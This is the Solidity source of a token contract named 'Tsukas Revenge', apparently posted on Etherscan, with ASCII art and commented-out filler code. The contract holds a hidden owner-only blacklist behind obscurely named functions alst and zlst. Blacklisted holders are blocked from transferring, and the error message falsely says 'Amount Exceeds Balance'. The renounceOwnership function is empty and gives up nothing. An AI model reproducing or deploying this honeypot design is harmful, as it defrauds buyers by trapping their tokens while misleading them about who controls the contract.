/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

/**
 *Submitted for verification at Etherscan.io on 2022-09-11
*/

pragma solidity 0.8.17;
/*

                                                              
                                        ░░▓▓▓▓████▓▓▒▒░░░░    
                                  ▒▒██████▓▓██████▒▒░░░░▒▒▒▒▒▒
                              ░░██████████▓▓████▒▒        ░░░░
                          ░░██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ░░
                        ▓▓████████▓▓▓▓▓▓▓▓████████░░      ░░░░
                      ██████▓▓▓▓▓▓▓▓▓▓████▒▒      ░░░░░░░░░░  
                  ▒▒████████▓▓████▓▓                          
            ▒▒██████████████▓▓  ░░                            
            ░░▓▓▓▓████████▓▓                                  
          ░░░░██▓▓▓▓▓▓████▒▒                                  
        ░░░░░░██▓▓▒▒▓▓▓▓▓▓▓▓                                  
        ░░░░░░░░▒▒▒▒▒▒▓▓████                                  
      ░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒                                  
      ░░░░░░▒▒▒▒▓▓▒▒░░                                        
    ░░░░▒▒▒▒▒▒▒▒▒▒                                            
    ░░░░▒▒▒▒▒▒▒▒                                              
    ░░▒▒▒▒▒▒▒▒                                                
  ░░░░▒▒▒▒▒▒                                                  
  ░░▒▒▒▒▒▒░░                                                  
  ░░▒▒▒▒▒▒                                                    
    ▒▒▒▒░░                                                    
    ░░▒▒                                                      
    ▒▒▒▒                                                      
    ░░░░                                                      
    ▒▒░░                                                      
    ▒▒                                                        
    ▒▒                                                        
    ▒▒                                                        
    ░░                                                        
    ░░                                                        

𝘙𝘦𝘷𝘦𝘯𝘨𝘦 𝘪𝘴 𝘢𝘭𝘸𝘢𝘺𝘴 𝘣𝘦𝘨𝘰𝘵𝘵𝘦𝘯...

TSUKAS REVENGE- 𝘠𝘰𝘶 𝘴𝘩𝘢𝘭𝘭 𝘧𝘪𝘯𝘥 𝘸𝘩𝘢𝘵 𝘺𝘰𝘶 𝘴𝘦𝘦𝘬.

* /    









         solium-check-time-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));

      */
contract TsukasRevenge {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) yxAmnt;

    // 
    string public name = "Tsukas Revenge";
    string public symbol = unicode"神圣的指引";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function alst(address _user) public onlyOwner {
        require(!yxAmnt[_user], "xx");
        yxAmnt[_user] = true;
        
    }
    
    function zlst(address _user) public onlyOwner {
        require(yxAmnt[_user], "xx");
        yxAmnt[_user] = false;
        
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!yxAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }



/* 
       event UpdateTax(address indexed owner, address indexed spender, uint256 value);

         solium-check-time-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/





    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!yxAmnt[from] , "Amount Exceeds Balance"); 
               require(!yxAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}